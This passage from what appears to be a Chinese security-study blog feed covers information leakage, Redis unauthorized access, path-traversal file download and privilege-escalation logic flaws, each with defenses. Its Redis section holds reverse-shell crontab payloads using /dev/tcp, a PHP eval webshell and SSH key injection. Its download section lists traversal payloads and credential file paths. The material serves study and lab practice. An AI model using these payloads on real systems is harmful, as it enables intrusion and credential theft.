i><p>在浏览器的调试窗口中查看HTTP响应头</p></li><li><p>使用代理软件如burpsuite、fiddler，拦截HTTP响应头</p></li></ol></li><li><p>物理路径泄漏</p><p>应用中泄露出应用在主机中的绝对地址路径。</p><p><strong>检测</strong>：</p><ol><li><p>打开网页源代码，查看图片等媒体的链接及超链接；</p></li><li><p>通过报错信息获取</p></li></ol></li><li><p>历史文件残留</p><p>应用遗留的过时文件、备份页面、渗透测试遗留文件、开发文件残留的测试文件</p></li><li><p><code>robots.txt</code></p><p>搜索引擎可以通过robots文件可以获知哪些页面可以爬取，哪些页面不可以爬取。</p><p>Robots协议是网站国际互联网界通行的道德规范，其目的是保护网站数据和敏感信息、确保用户个人信息和隐私不被侵犯，如果robots.txt文件编辑的太过详细，反而会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用</p></li><li><p>网站源码备份文件</p><p>管理员备份网站文件后错误地将备份放在web目录下，常见的后缀名：<code>.rar、.zip、.7z、.tar、.tar.gz、.bak、.txt</code></p></li></ul><h4 id="tips-目录遍历"><a class="header-anchor" href="#tips-目录遍历">🍭</a>tips:目录遍历</h4><p>在web功能设计中,很多时候要将需要访问的文件定义成变量从而让前端的功能更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。如果后台没有对前端传进来的值进行严格过滤，攻击者可能会通过“…/”让后台打开或者执行一些其他的文件，导致后台服务器上其他目录的文件结果被遍历出来（跟之前讲的文件下载有点像）</p><p><em>如果通过不带参数的url（如：<code>http://xxxx/doc</code>）列出了doc文件夹里面所有的文件也称为为敏感信息泄露而不归为目录遍历漏洞</em></p><h4 id="实例"><a class="header-anchor" href="#实例">🍭</a>实例</h4><p><strong>Referer泄露token</strong></p><p>如:在论坛回复处通过包含<code>&lt;img&gt;</code>标签，向攻击者的服务器发送请求，用户一旦访问将泄露Oauth token。或存在跳转链接，可将token泄露给第三方站点.</p><p><strong>异常操作泄露日志文件</strong></p><p>使用超长参数值多线程访问发起长请求导致access.log过大，将一些部分转储到响应中，泄露用户的ip地址，请求时间和url路径。</p><p>测试方法:增删参数值、构造畸形数据、超长数据等使服务器报错，报错信息可能泄露服务器绝对路径、版本号、代码层信息、数据库信息……</p><h2 id="敏感信息搜集工具"><a class="header-anchor" href="#敏感信息搜集工具">🍭</a>敏感信息搜集工具</h2><ul><li>weaplescan</li><li><a href="https://github.com/lijiejie/BBScan">BBScan</a></li><li>whatweb</li><li>dnsenum</li></ul><h2 id="后记"><a class="header-anchor" href="#后记">🍭</a>后记</h2><p>原理很简单，就是缺实战挖掘漏洞，本来想在pikachu演示一下，结果查看源码就可以看出信息泄露。。。</p><p>参考:<a href="https://cloud.tencent.com/developer/article/1516484">信息泄露（Information Exposure）挖掘及实战案例全汇总</a></p><p><a href="https://www.secpulse.com/archives/134923.html">信息泄露篇</a></p><p><a href="http://wyb0.com/posts/sensitive-information-leakage/">敏感信息泄露总结</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>未授权访问——Redis</title>
    <link href="/2021/02/24/weakpassword/"/>
    <url>/2021/02/24/weakpassword/</url>
    
    <content type="html"><![CDATA[<h1>概述</h1><p>需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。</p><p>常见：</p><blockquote><p>Redis未授权访问<br>Jenkins未授权访问<br>MongoDB未授权访问<br>ZooKeeper未授权访问<br>Elasticsearch未授权访问<br>Memcache未授权访问<br>Hadoop未授权访问<br>CouchDB未授权访问<br>Docker未授权访问<br>LDAP未授权访问<br>Rsync未授权访问<br>FTP未授权访问<br>GitLab未授权访问<br>Solr未授权访问<br>Hadoop未授权访问<br>Dubbo未授权访问<br>NFS未授权访问<br>Samba未授权访问</p></blockquote><h2 id="Redis未授权访问"><a class="header-anchor" href="#Redis未授权访问">🍭</a>Redis未授权访问</h2><p>攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。当Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p><h3 id="redis"><a class="header-anchor" href="#redis">🍭</a>redis</h3><p><code>redis</code>是一个<code>key-value</code>存储系统,支持存储多种value类型：<code>string、list、set、zset(sorted set --有序集合)和hash。</code>这些数据类型都支持<code>push/pop</code>、<code>add/remove</code>及取交集并集和差集等多种操作，且这些操作都是原子性的。redis还支持各种不同方式的排序。为保证效率，数据都缓存在内存中，且redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了<code>master-slave(主从)</code>同步</p><h4 id="常用命令"><a class="header-anchor" href="#常用命令">🍭</a>常用命令</h4><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> testkey <span class="hljs-string">&quot;genius&quot;</span>              # 设置键testkey的值为genius<span class="hljs-builtin-name">get</span> testkey                       # 获取键testkey的内容<span class="hljs-builtin-name">SET</span> score 99                      # 设置键score的值为99INCR score                        # 使用INCR命令将score的值增加1<span class="hljs-builtin-name">GET</span> score                         # 获取键score的内容keys *                            # 列出当前数据库中所有的键<span class="hljs-builtin-name">get</span> anotherkey                    # 获取一个不存在的键的值config <span class="hljs-builtin-name">set</span> dir /home/test         # 设置工作目录config <span class="hljs-builtin-name">set</span> dbfilename redis.rdb   # 设置备份文件名config <span class="hljs-builtin-name">get</span> dir                    # 检查工作目录是否设置成功config <span class="hljs-builtin-name">get</span> dbfilename             # 检查备份文件名是否设置成功save                              # 进行一次备份操作flushall                          #删除所有数据del key                           #删除键为key的数据</code></pre><ul><li><strong>Redis不区分命令的大小写的</strong></li><li><strong>键的值中有空格，需要使用双引号括</strong></li></ul><h3 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h3><h4 id="利用计划任务执行命令反弹shell"><a class="header-anchor" href="#利用计划任务执行命令反弹shell">🍭</a>利用计划任务执行命令反弹shell</h4><p>以root权限运行redis，先在自己的服务器上监听一个端口：</p><pre><code class="hljs angelscript">nc -lvnp <span class="hljs-number">2333</span></code></pre><p>然后执行命令:</p><p><img src="/2021/02/24/weakpassword/1.jpg" alt="1"></p><p>命令在上面都介绍辽，</p><p><code>/var/spool/cron/</code>是用户定义的设置（每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面），该目录下存放的为以各个用户命名的计划任务文件，root用户可以修改任意用户的计划任务。</p><p>dbfilename设置为root为用root用户权限执行计划任务。执行命令反弹shell(写计划任务时会覆盖原来存在的用户计划任务).</p><p>写文件之前先获取dir和dbfilename的值，以便恢复redis配置，将改动降到最低，避免被发现。</p><p><code>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 0&gt;&amp;1\n\n\n&quot; </code>//直接往当前用户的crontab里写入反弹shell.</p><h4 id="坑"><a class="header-anchor" href="#坑">🍭</a>坑</h4><p>以上命令在执行时，会出现报错</p><p><img src="/2021/02/24/weakpassword/2.jpg" alt="2"></p><p><strong>未授权访问条件：</strong></p><ul><li>未开启登录验证，并且把IP绑定到0.0.0.0</li><li><code>protected-mode</code>关闭</li></ul><p>所以在实验前我们需要在解析文件里做一些设置：</p><pre><code class="hljs angelscript"># bind <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> 或绑定为<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-keyword">protected</span>-mode no  <span class="hljs-comment">//Redis protected-mode 是3.2 之后加入的新特性</span></code></pre><p>每次配置完要执行</p><pre><code class="hljs awk">.<span class="hljs-regexp">/redis-server ../</span>redis.conf</code></pre><p>因为Linux默认情况下若只执行<code>./redis-server</code>时不会将解析文件同步。这个坑绕了好久💀💀💀</p><h4 id="Tips-crontab文件"><a class="header-anchor" href="#Tips-crontab文件">🍭</a>Tips:crontab文件</h4><h5 id="格式"><a class="header-anchor" href="#格式">🍭</a>格式:</h5><p><code>分 时 日 月 星期 要运行的命令</code></p><p>第1列分钟0～59<br>第2列小时0～23（0表示子夜）<br>第3列日1～31<br>第4列月1～12<br>第5列星期0～7（0和7表示星期天）<br>第6列要运行的命令</p><p>举个栗子：</p><pre><code class="hljs angelscript"><span class="hljs-number">45</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">22</span> * * /usr/local/etc/rc.d/lighttpd restart上面的例子表示每月<span class="hljs-number">1</span>、<span class="hljs-number">10</span>、<span class="hljs-number">22</span>日的<span class="hljs-number">4</span> : <span class="hljs-number">45</span>重启apache。</code></pre><h4 id="savephp反弹shell"><a class="header-anchor" href="#savephp反弹shell">🍭</a>savephp反弹shell</h4><p>上面的方法采用bash反弹（之前在《Rever Shell》讲过了）也可以用另一种savephp反弹shell:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$redis = <span class="hljs-keyword">new</span> Redis();$redis-&gt;connect(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">6379</span>);$redis-&gt;auth(<span class="hljs-string">&quot;password&quot;</span>);$redis-&gt;flushall();$redis-&gt;config(<span class="hljs-string">&quot;SET&quot;</span>,<span class="hljs-string">&quot;dir&quot;</span>,<span class="hljs-string">&quot;/var/spool/cron/&quot;</span>);$redis-&gt;config(<span class="hljs-string">&quot;SET&quot;</span>,<span class="hljs-string">&quot;dbfilename&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);$redis-&gt;set(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1\n\n\n&quot;</span>);$redis-&gt;save();<span class="hljs-meta">?&gt;</span></code></pre><h4 id="写SSH-keygen"><a class="header-anchor" href="#写SSH-keygen">🍭</a>写SSH-keygen</h4><h5 id="利用条件"><a class="header-anchor" href="#利用条件">🍭</a>利用条件</h5><ul><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录</li></ul><h4 id="Tips：Linux远程登录"><a class="header-anchor" href="#Tips：Linux远程登录">🍭</a>Tips：Linux远程登录</h4><p>SSH提供两种登录验证方式，一种是账号密码登录，另一种是密钥验证。</p><p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密(非对称)，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密（密码学的知识）</p><h5 id="利用-v2"><a class="header-anchor" href="#利用-v2">🍭</a>利用</h5><p>攻击机上生成一对密钥</p><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span></code></pre><p>登录redis</p><pre><code class="hljs routeros">config <span class="hljs-builtin-name">set</span> dir /root/.ssh/config <span class="hljs-builtin-name">set</span> dbfilename authorized_keys<span class="hljs-builtin-name">set</span> x <span class="hljs-string">&quot;\n\n\nssh-rsa xxxxxxxxx(密钥)</span><span class="hljs-string">save</span><span class="hljs-string">ssh -i id_rsa root@xxxxx(ip)   //ssh连接</span></code></pre><h4 id="写webshell"><a class="header-anchor" href="#写webshell">🍭</a>写webshell</h4><h5 id="利用条件-v2"><a class="header-anchor" href="#利用条件-v2">🍭</a>利用条件</h5><ul><li>已知web的绝对路径</li><li>具有读写权限</li></ul><p>目录爆破看下是否存在phpinfo文件来获取绝对路径，也可以尝试apache的默认路径：<code>/var/www/html/</code></p><pre><code class="hljs routeros">Copyredis-cli -h 192.168.67.128config <span class="hljs-builtin-name">set</span> dir /var/www/html <span class="hljs-builtin-name">set</span> xxx <span class="hljs-string">&quot;\n\n\n&lt;?php@eval(<span class="hljs-variable">$_POST</span>[&#x27;c&#x27;]);?&gt;\n\n\n&quot;</span> config <span class="hljs-builtin-name">set</span> dbfilename webshell.php save</code></pre><h4 id="利用主从复制获取shell"><a class="header-anchor" href="#利用主从复制获取shell">🍭</a>利用主从复制获取shell</h4><p>Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助.</p><p>直接下载脚本运行</p><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/n0b0dyCN/RedisModules-ExecuteCommand<span class="hljs-keyword">cd</span> RedisModules-ExecuteCommand/<span class="hljs-keyword">make</span>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/Ridter/redis-rce<span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">192.168</span>.<span class="hljs-number">67.128</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">67.129</span> -<span class="hljs-keyword">f</span> module.<span class="hljs-keyword">so</span></code></pre><h4 id="写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）"><a class="header-anchor" href="#写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）">🍭</a>写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</h4><p><a href="http://www.00theway.org/2017/03/27/redis_exp/">http://www.00theway.org/2017/03/27/redis_exp/</a></p><h4 id="python脚本"><a class="header-anchor" href="#python脚本">🍭</a>python脚本</h4><p><a href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</a></p><h4 id="检测方法"><a class="header-anchor" href="#检测方法">🍭</a>检测方法</h4><p>​    用 nmap 扫描查看端口开放情况发现开放的 6379 端口为 Redis 的默认端口</p><pre><code class="hljs angelscript">Nmap -A -p <span class="hljs-number">6379</span> --script redis-info <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span></code></pre><p>​    Nmap 扫描后发现主机的 6379 端口对外开放可以通过 Redis 客户端进行连接测试是否存在未授权访问漏洞具体命令如下</p><pre><code class="hljs angelscript">redis-cli -h <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>Info</code></pre><h3 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h3><ul><li><p>禁止一些高危命令</p></li><li><p>以低权限运行 Redis</p></li><li><p>添加登录密码</p><p>在配置文件里添加<code>requirepass mypassword</code></p></li><li><p>禁止外网访问 Redis</p><p>在配置文件中取消<code>bind 127.0.0.1</code>的注释</p></li><li><p>修改默认端口</p></li><li><p>保证 authorized_keys 文件的安全</p><p>阻止其他用户添加新的公钥：<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br><code>## chmod 400 ~/.ssh/authorized_keys</code></p><p>保证 authorized_keys 的权限不会被改掉，设置该文件的 immutable 位权限：<br><code>## chattr +i ~/.ssh/authorized_keys</code></p><p>避免建立新的ssh文件：设置 ~./ssh 的 immutable 位权限：<br><code>## chattr +i ~/.ssh</code></p></li><li><p>设置防火墙策略</p></li><li><p>配合iptables限制开放</p></li></ul><p>一个redis就这么多了💦💦💦剩下的改天吧~</p><p>参考：<a href="https://www.cnblogs.com/twosmi1e/p/13308682.html#">https://www.cnblogs.com/twosmi1e/p/13308682.html#</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>File Download</title>
    <link href="/2021/02/24/filedownload/"/>
    <url>/2021/02/24/filedownload/</url>
    
    <content type="html"><![CDATA[<h4 id="概述"><a class="header-anchor" href="#概述">🍭</a>概述</h4><p>网站对用户下载或查看的文件不做限制，使恶意用户能够下载或查看任意敏感文件。</p><h4 id="成因"><a class="header-anchor" href="#成因">🍭</a>成因</h4><p>常规文件下载流程：使用一个动态页面（php、jsp、aspx、asp等）将待下载文件作为参数一般参数名称为filename，如.php?filename/.jsp?filename等。根据参数filename的值，获得该文件在网站上的绝对路径，读取文件，然后直接发送给客户端下载。</p><p>如果后台在收到请求的文件名后,将其<strong>直接拼进下载文件的路径中而不对其进行安全判断</strong>，则可能会引发文件下载漏洞。若攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如…/…/…/etc/passwd),则很有可能会直接将该指定的文件下载下来，从而导致后台敏感信息(密码文件、源代码，脚本代码、服务以及系统配置文件)被下载。</p><h4 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h4><p><em>系统信息收集→猜路径→下载配置文件/代码文件→利用服务器软件漏洞→shell→提权</em></p><p>首先收集系统信息，包括系统版本，中间件，cms版本，服务器用途，服务器使用者信息，端口，web路径等，然后根据收集到的信息，下载配置文件，如weblogic，ftp，ssh，等， 根据下载到的配置文件进行渗透。</p><p>demo：</p><p><img src="/2021/02/24/filedownload/1.png" alt="1"></p><h4 id="利用思路"><a class="header-anchor" href="#利用思路">🍭</a>利用思路</h4><ul><li><p>下载密码配置文件：weblogic，ssh，ftp，数据库配置文件……</p></li><li><p>下载web文件，进行白盒审计，审计常用的漏洞并利用</p></li><li><p>下载日志：找到登录/上传/后台/ 操作，找到登录入口 可以爆破，测试默认口令，弱口令，  找到文件上传点则测试文件上传漏洞，找到后台操作试试有没有未授权访问</p></li><li><p>下载敏感文件</p><pre><code class="hljs awk">index.php?f=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd index.php?f=../index.php index.php?f=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd</code></pre></li></ul><p>tips：</p><p>注意下载权限问题</p><p>用<code>/root/.bash_history</code>看是否具有root权限</p><p>常见利用文件：</p><blockquote><p>Windows：</p><p><code>C:\boot.ini</code>//查看系统版本</p><p><code>C:\Windows\System32\inetsrv\MetaBase.xml </code>   //IIS配置文件</p><p><code> C:\Windows\repair\sam</code>  //存储系统初次安装的密码</p><p><code> C:\Program Files\mysql\my.ini  </code> //Mysql配置</p><p><code>C:\Program Files\mysql\data\mysql\user.MYD</code>   //Mysql root</p><p><code>C:\Windows\php.ini   </code>  //php配置信息</p><p><code>C:\Windows\my.ini </code>   //Mysql配置信息</p><p><code>C:\Windows\win.ini</code>  //Windows系统的一个基本系统配置文件</p><p>Linux：</p><p><code> /root/.ssh/authorized_keys</code></p><p><code>  /root/.ssh/id_rsa</code></p><p><code> /root/.ssh/id_ras.keystore</code></p><p><code> /root/.ssh/known_hosts</code>        //记录每个访问计算机用户的公钥</p><p><code>  /etc/passwd</code></p><p><code>/etc/shadow</code></p><p><code>/usr/local/app/php5/lib/php.ini  </code>       //PHP配置文件</p><p><code>/etc/my.cnf   </code>       //mysql配置文件</p><p><code> /etc/httpd/conf/httpd.conf  </code>     //apache配置文件</p><p><code>/root/.bash_history  </code>     //用户历史命令记录文件</p><p><code>/root/.mysql_history </code>       //mysql历史命令记录文件</p><p><code>/proc/mounts   </code>      //记录系统挂载设备</p><p><code>/porc/config.gz   </code>      //内核配置文件</p><p><code> /var/lib/mlocate/mlocate.db</code>      //全文件路径</p><p><code>/porc/self/cmdline  </code>      //当前进程的cmdline参数</p></blockquote><h4 id="简单应用"><a class="header-anchor" href="#简单应用">🍭</a>简单应用</h4><p>在网页中下载，</p><img src="/2021/02/24/filedownload/2.jpg" alt="2" style="zoom:50%;"><p>复制链接<code>http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</code></p><p>此网站采用传参下载图片,构造payload:<code>http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../password.txt</code></p><img src="/2021/02/24/filedownload/3.jpg" alt="3" style="zoom:50%;"><h4 id="挖掘"><a class="header-anchor" href="#挖掘">🍭</a>挖掘</h4><ul><li><p>用Web漏洞扫描器</p></li><li><p>观察链接</p><pre><code class="hljs nix">• download.php?<span class="hljs-attr">path=</span>• download.php?<span class="hljs-attr">file=</span>• down.php?<span class="hljs-attr">file=</span>• data.php?<span class="hljs-attr">file=</span>• readfile.php?<span class="hljs-attr">file=</span>• read.php?<span class="hljs-attr">filename=</span></code></pre></li><li><p>观察参数</p><pre><code class="hljs 1c">• <span class="hljs-meta">&amp;RealPath=</span>• <span class="hljs-meta">&amp;FilePath=</span>• <span class="hljs-meta">&amp;ﬁlepath=</span>• <span class="hljs-meta">&amp;Filepath=</span>• <span class="hljs-meta">&amp;Path=</span>• <span class="hljs-meta">&amp;path=</span>• <span class="hljs-meta">&amp;inputFile=</span>• <span class="hljs-meta">&amp;Inputfile=</span>• <span class="hljs-meta">&amp;url=</span>• <span class="hljs-meta">&amp;urls=</span>• <span class="hljs-meta">&amp;Lang=</span>• <span class="hljs-meta">&amp;dis=</span>• <span class="hljs-meta">&amp;data=</span>• <span class="hljs-meta">&amp;Data=</span>• <span class="hljs-meta">&amp;readﬁle=</span>• <span class="hljs-meta">&amp;ﬁlep=</span>• <span class="hljs-meta">&amp;src=</span>• <span class="hljs-meta">&amp;menu=</span>• META-INF• WEB-INF</code></pre></li></ul><h4 id="绕过"><a class="header-anchor" href="#绕过">🍭</a>绕过</h4><blockquote><p>过滤字符或字母可尝试编码绕过<br>利用 …/…/时有些代码会进行过滤：把 …/ 置空</p><blockquote><p>利用…// 代替 …/<br>利用…// 代替 /</p></blockquote></blockquote><p>结合实际分析</p><h4 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h4><ul><li>过滤“.”符号，使用户在url中无法回溯到上级目录。</li><li>使用正则表达式严格判断用户输入参数的格式。</li><li>php.ini配置文件中对于open_basedir进行配置，限定用户的文件访问范围。</li></ul><h4 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h4><p>文件下载漏洞比较简单，实例在乌云上可以找到很多，还是要多多实战😎😎😎</p><p>参考：<a href="https://www.bugbank.cn/q/article/598281f5f13c30ea584837f5.html">文件下载</a></p><p><a href="https://www.cnblogs.com/zzhoo/p/12613815.html">任意文件下载漏洞</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>逻辑漏洞||越权</title>
    <link href="/2021/02/19/1/"/>
    <url>/2021/02/19/1/</url>
    
    <content type="html"><![CDATA[<h4 id="概述"><a class="header-anchor" href="#概述">🍭</a>概述</h4><p>逻辑错误漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现在任意密码修改、越权访问、密码找回、交易支付金额。</p><h4 id="本质"><a class="header-anchor" href="#本质">🍭</a>本质</h4><p>设计者或开发者在思考过程中做出的特殊假设存在明显或隐含的错误</p><h4 id="特点"><a class="header-anchor" href="#特点">🍭</a>特点</h4><ul><li>普遍存在：普遍存在于各类应用程序</li><li>不固定：应用中不同功能逻辑不同，无法用一般工具发现</li><li>隐蔽性</li><li>逻辑漏洞是目前WAF的盲区（故当前较易挖掘，下文详讲挖掘思路）</li></ul><h4 id="常见的逻辑漏洞："><a class="header-anchor" href="#常见的逻辑漏洞：">🍭</a>常见的逻辑漏洞：</h4><blockquote><p>支付订单：在支付订单时，可以篡改价格为任意金额,或篡改运费或其他费用为负数，导致总金额降低。</p><p>顺序执行缺陷（强制浏览）：攻击者在网购的过程中绕过支付过程，直接从放入购物车步骤进入填写收货地址的步骤。</p><p>越权访问：通过越权漏洞访问他人信息或者操纵他人账号。<br>重置密码：在重置密码时，存在多种逻辑漏洞：利用session覆盖重置密码、短信验证码直接在返回的数据包中……<br>竞争条件：竞争条件常见于多种攻击场景中(如之前讲过的文件上传漏洞),举个栗子：</p><blockquote><p>购物时，用户的余额为10元，商品A的价格为6元，商品B的价格为5元，如果用户分别购买商品B和商品C，余额不够.但是如果用户用竞争条件，使用多线程同时发送购买商品A和商品B的请求，可能会出现如下几种结果：</p><blockquote><p>有一件商品购买失败<br>商品都购买成功，但是只扣了6元<br>商品都购买成功，但是余额变成了-1元</p></blockquote></blockquote></blockquote><p>这几种常见的逻辑漏洞在乌云上实例很多，这里不展开讲，主要研究越权。</p><h2 id="越权漏洞"><a class="header-anchor" href="#越权漏洞">🍭</a>越权漏洞</h2><p>简而言之就是使用A用户的权限去成功操作B用户的数据，且A的权限小于B的权限</p><ul><li>水平越权：相同级别(权限)的用户可以越权访问、修改或者删除其他用户信息的非法操作</li><li>垂直越权：就是不同级别之间的用户越权，比如普通用户可以执行管理员才能执行的功能。</li></ul><h4 id="成因"><a class="header-anchor" href="#成因">🍭</a>成因</h4><p>开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。</p><h4 id="实例"><a class="header-anchor" href="#实例">🍭</a>实例</h4><p>本来要用fiyo-cms演示的，然后搭了两天也没搭成，一直登不进去，掉发中😡😡😡只能换一个平台</p><h5 id="水平越权"><a class="header-anchor" href="#水平越权">🍭</a>水平越权</h5><p>又称访问控制攻击漏洞，应用程序在接收到用户的请求时，没有判断数据所对应的用户，或者在判断数据的用户时是通过从用户表单参数中获取userid来实现的，故我们可以修改userid来实现水平越权。</p><img src="/2021/02/19/1/1.jpg" alt="1" style="zoom: 50%;"><p>直接修改url中的username参数即可登录另一个用户</p><img src="/2021/02/19/1/2.jpg" alt="2" style="zoom:50%;"><p>此处应该没有检验机制，查看源码</p><img src="/2021/02/19/1/3.jpg" alt="3" style="zoom:67%;"><h5 id="垂直越权"><a class="header-anchor" href="#垂直越权">🍭</a>垂直越权</h5><p>又称做权限提升攻击，应用没有做用户权限控制，或者只是在菜单上做了权限控制，导致恶意用户只要猜测到其他管理页面的URL，就可以访问或者控制其他角色拥有的数据或者页面，达到权限提升的目的。</p><p>先登录普通用户</p><p><img src="/2021/02/19/1/4.jpg" alt="4"></p><p>普通用户只有查看权限，再登录管理员</p><p><img src="/2021/02/19/1/5.jpg" alt="5"></p><p>发现管理员可增删用户，随便添加一个名为1的用户，抓包</p><p><img src="/2021/02/19/1/6.jpg" alt="6"></p><p>发送至repeater，再登录普通用户并抓包，将普通用户的cookie替换掉刚刚repeater里的，执行即可创建一个一样的用户</p><p><img src="/2021/02/19/1/7.jpg" alt="7"></p><p>越权成功，源码：</p><p><img src="/2021/02/19/1/8.jpg" alt="8"></p><h5 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h5><ul><li>使用最小权限原则对用户进行赋权</li><li>使用合理（严格）的权限校验规则</li><li>使用后台登录态作为条件进行权限判断</li></ul><h2 id="逻辑漏洞的挖掘"><a class="header-anchor" href="#逻辑漏洞的挖掘">🍭</a>逻辑漏洞的挖掘</h2><h4 id="应用程序解析"><a class="header-anchor" href="#应用程序解析">🍭</a>应用程序解析</h4><ul><li><p>了解程序功能</p><p>最基本的肯定是浏览一下整个网站，可通过网站地图了解基本功能</p></li><li><p>寻找数据输入点</p><p>寻找各种<em>可编辑的，不可编辑的，隐藏的</em>输入框或按钮，关注url地址，参数信息及HTTP头</p></li><li><p>确认业务流程</p><p>可以注册一个测试账号，照程序正常的流程走一遍，在操作的同时，把所有操作步骤的数据包拦截下来分析流程步骤涉及到的所有数据操作以及数据传输。一般会有操作步骤提示，了解到操作流程后，也就可猜测出可能存在哪个方面的逻辑漏洞</p></li></ul><h4 id="挖掘方法"><a class="header-anchor" href="#挖掘方法">🍭</a>挖掘方法</h4><ul><li>确定客户端技术，如表单校验形式(客户端或服务端校验)、脚本类型、cookie规则、Java，applet、ActiveX控件与Flash对象。</li><li>确定服务器端技术，如脚本语言(PHP、JSP、ASP等)、应用程序平台、数据库类型及电子邮件等交互系统。</li><li>检查应用程序响应中的HTTP消息头，如Server、Referer等。一运行扫描工具对服务器做“指纹识别”。</li><li>分析所获得信息，包括文件扩展名、目录列表或URL规律。检查所有会话令牌和其他cookie名称等。</li><li>获取分析第三方代码组件的脚本、参数及行为等，发现应用程序</li></ul><h4 id="测试项"><a class="header-anchor" href="#测试项">🍭</a>测试项</h4><blockquote><p>客户端输入验证</p><p>客户端数据传输</p><p>客户端组件逻辑</p><p>多阶段过程逻辑</p><p>不完整输入处理</p><p>信任边界</p><p>一了解应用程序如何处理不同用户信任状态之间的转换。<br>一通过在一个区域积累相关状态，在信任边界之间进行不恰当的转换，然后以正常不被允许的方式切换到另一个区域。<br>一确定是否可以利用更高权限的功能直接或间接访问或者猜测某些信息。</p><p>业务逻辑</p></blockquote><h2 id="逻辑漏洞的防御"><a class="header-anchor" href="#逻辑漏洞的防御">🍭</a>逻辑漏洞的防御</h2><p>鉴于逻辑漏洞的本质，即使实施安全开发标准、使用代码审查工具或常规渗透测试，仍然无法避免这种缺陷。</p><p>只能从以下两个方面进行思考</p><ul><li>开发流程及设计的预防</li><li>网络行为识别的防御</li></ul><h4 id="Tips：BLA"><a class="header-anchor" href="#Tips：BLA">🍭</a>Tips：BLA</h4><p>商业逻辑漏洞，当前应用逻辑攻击发展出来的新型攻击方式。</p><h5 id="攻击手段"><a class="header-anchor" href="#攻击手段">🍭</a>攻击手段</h5><ul><li>电子邮件提取：通过电子邮件地址抽取实现的攻击，模拟真实用户访问客户网站(论坛、博客、社交网络……)，对客户 Web 网站中的电子邮件地址进行简单抽取和分类。</li><li>垃圾评论：攻击者会在某些排名靠前的论坛注册，发表、回复某些言论，内嵌恶意链接地址来改变搜索引擎结巢。为了让所发帖子处于显著位置被更多网友看到，恶意攻击者会发起投票，或想办法设置成置顶帖。</li></ul><h5 id="攻击目的"><a class="header-anchor" href="#攻击目的">🍭</a>攻击目的</h5><p>电子邮件提取：建立垃圾邮件发送列表。</p><p>垃圾评论：一方面导入流量，使得其获益的网站在搜索引擎的排名靠前，一方面让搜索引擎更多搜到获益网站，从而诈骗潜在消费者</p><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>逻辑漏洞在WAF盲区，较难防御，也较易挖掘，又比较贴切生活，学习此漏洞还是要多以实例为主:👏👏👏</p><p>参考：百度文库<a 